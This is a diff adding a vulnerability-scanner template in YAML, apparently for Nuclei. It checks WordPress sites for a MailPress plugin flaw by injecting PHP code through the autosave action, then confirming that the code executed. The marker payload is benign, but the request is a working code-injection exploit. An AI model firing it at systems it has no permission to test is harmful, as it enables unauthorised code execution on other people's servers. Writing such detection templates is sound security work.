@@ -1,0 +1,47 @@
+id: wordpress-plugin-mailpress-action-php-rce
+info:
+  name: WordPress MailPress Plugin RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits an RCE vulnerability in the WordPress MailPress plugin via the autosave action.
+  reference:
+    - https://github.com/Medicean/VulApps/tree/master/w/wordpress/2
+
+variables:
+  r: '{{rand_int(800000000, 1000000000)}}'
+  r1: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - id: r0
+    name: Initial Exploit
+    method: POST
+    path:
+      - '{{BaseURL}}/wp-content/plugins/mailpress/mp-includes/action.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}%2b{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
+    extractors:
+      - type: regex
+        name: id
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "<autosave id=''(?P<id>.+?)''"
+
+  - id: r1
+    name: Payload Verification
+    method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{id}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{concat(r, r1)}}'
+        part: body
